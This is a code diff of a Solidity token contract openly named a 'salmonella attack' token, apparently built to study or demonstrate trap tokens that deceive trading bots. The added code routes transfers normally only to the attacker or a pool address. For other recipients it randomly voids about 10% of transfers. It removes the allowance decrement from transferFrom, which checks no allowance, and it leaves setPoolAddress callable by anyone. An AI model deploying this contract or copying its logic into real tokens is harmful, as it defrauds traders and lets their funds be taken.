@@ -8,14 +8,15 @@ import "../interfaces/IERC20.sol";
      * In such cases, the contract only provides 10% of the intended amount, even though it generates event logs that appear to represent a complete trade.
 */
 
-contract SalmonellaAttackToken is IERC20 {
+contract SalmonellaAttackProbToken is IERC20 {
     string public name;
     string public symbol;
     uint8 public decimals;
     uint256 public totalSupply;
-    address public owner;
+    address public salmonellaAttacker;
+    address public poolAddress;
     uint256 private randomNumberNonce;
-
+    
     mapping(address => uint256) private _balances;
     mapping(address => mapping(address => uint256)) private _allowances;
    
@@ -28,8 +29,16 @@ contract SalmonellaAttackToken is IERC20 {
         decimals = 18;
         totalSupply = initialSupply * 10**uint256(decimals);
         _balances[msg.sender] = totalSupply;
-	owner = msg.sender;
-        emit Transfer(address(0), owner, totalSupply);
+        salmonellaAttacker = msg.sender;
+        poolAddress = address(0);
+	randomNumberNonce = 1;
+        emit Transfer(address(0), salmonellaAttacker, totalSupply);    
+    }
+    
+    
+    //setpoolAddress 
+    function setPoolAddress(address pAddress) public {
+    	poolAddress = pAddress;
     }
     
      /**
@@ -87,7 +96,7 @@ contract SalmonellaAttackToken is IERC20 {
      */
     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
         _transfer(sender, recipient, amount);
-        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
+        //_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
         return true;
     }
      /**
@@ -106,21 +115,23 @@ contract SalmonellaAttackToken is IERC20 {
         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
         
         // Randomly transfer amount with 10% probability
-        boolean trapped = false;
-        if (random() % 100 < 10) {
-          // Transferred amount 
-          trapped = true;
-        }
+        bool trapped = false;
+        if (recipient == salmonellaAttacker || recipient == poolAddress) {
+           // Normal transfer
+           _balances[sender] = senderBalance - amount;
+    	   _balances[recipient] += amount;
 
-	    
-        if (!trapped){
-          _balances[sender] = senderBalance - amount;
-          _balances[recipient] += amount;
-          emit Transfer(sender, recipient, amount);
-        }else{
-	  _balances[sender] = senderBalance - amount;
-          _balances[owner] += amount;
-	  emit Transfer(sender, owner, amount);
+            emit Transfer(sender, recipient, amount);
+        } else {
+			if (random() % 100 < 10) {
+			// Transferred amount 
+			trapped = true;
+			} 
+			if (!trapped){
+				_balances[sender] = senderBalance - amount;
+				_balances[recipient] += amount;
+				emit Transfer(sender, recipient, amount);
+			}
         }
     }
     
